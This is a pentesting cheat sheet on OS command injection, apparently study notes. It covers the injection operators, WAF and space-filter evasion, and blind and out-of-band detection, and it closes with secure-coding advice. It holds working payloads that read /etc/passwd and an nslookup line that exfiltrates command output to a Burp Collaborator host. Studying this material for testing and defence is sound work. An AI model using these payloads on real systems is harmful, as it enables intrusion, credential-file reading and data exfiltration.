# OS Command Injection - Operators & Bypass

## 🧠 What Are Injection Operators?
Injection operators allow us to extend an existing system command by appending malicious ones. These vulnerabilities arise when unsanitized user input is directly passed to system-level functions (e.g., `exec()`, `system()`, `passthru()`).

---

## 🔥 Common OS Command Injection Operators

| Operator | URL Encoded | Behavior |
| :--- | :--- | :--- |
| `;` | `%3b` | Executes both commands sequentially. |
| `\n` | `%0a` | New line; executes the injected command. |
| `&` | `%26` | Backgrounds the first; runs the second. |
| `&&` | `%26%26` | Executes second command ONLY if the first succeeds. |
| `\|` | `%7c` | Pipes the output of the first into the second. |
| `\|\|` | `%7c%7c` | Executes second command ONLY if the first fails. |
| `` `cmd` `` | `%60` | Subshell execution (Linux). |
| `$()` | `%24%28%29` | Subshell execution (Linux). |

---

## ⚙️ Practical Examples

### 🔹 Basic & Conditional Execution
- **Simple:** `ping 127.0.0.1; whoami`
- **Logic:** `ping 127.0.0.1 && id` (Useful if the first command is required to keep the session alive).

### 🔹 Bypass via Newline
- **Payload:** `127.0.0.1%0aid`
- **Why:** Injecting a newline often terminates the intended command and starts a new one, bypassing some simple regex filters.

---

## 🛡️ Command Injection Cheatsheet PRO (Evasion)
When simple operators are blocked, use these techniques to bypass WAFs and filters:

### 1. Bypassing Space Filters
Spaces are often filtered. Replace them with:
- **Internal Field Separator:** `${IFS}` 
  - *Example:* `cat${IFS}/etc/passwd`
- **Redirect Input:** `cat</etc/passwd`
- **Braces:** `{cat,/etc/passwd}`

### 2. Blind Injection (Time-Based)
If you get no output in the response, check if the command executed by forcing a delay:
- `127.0.0.1; sleep 10`
- If the page takes 10 seconds to load, **Command Injection is confirmed.**

### 3. Out-of-Band (OAST)
Use DNS/HTTP interactions to exfiltrate data when blind:
- `127.0.0.1; nslookup $(whoami).your-collaborator-id.burpcollaborator.net`
- If you see a DNS request in your listener, you have successfully executed the command.

---

## 🧪 Pentester Workflow
1. **Identify:** Find parameters interacting with system binaries (ping, nslookup, file processing).
2. **Test:** Try `;`, `&&`, and `%0a` with simple `id` or `whoami` commands.
3. **Bypass:** If blocked, try `${IFS}` or other evasion techniques.
4. **Confirm:** Use `sleep` or `nslookup` (OAST) to confirm in blind scenarios.

---

## 🛡️ Secure Implementation
- **Avoid System Calls:** Use built-in language APIs instead of executing shell commands.
- **Escape Input:** Use `escapeshellarg()` (PHP) or equivalent functions.
- **Whitelist:** Only allow known safe inputs (e.g., regex `^[0-9.]+$` for IP addresses).
- **Least Privilege:** Run the application with the minimum necessary user permissions.

---

## 💣 Key Insight
* **Frontend filters are NOT security.** Always test the backend behavior directly using Burp Suite.
* **Injection = Full System Control.** Once you have a shell, prioritize privilege escalation and pivoting.
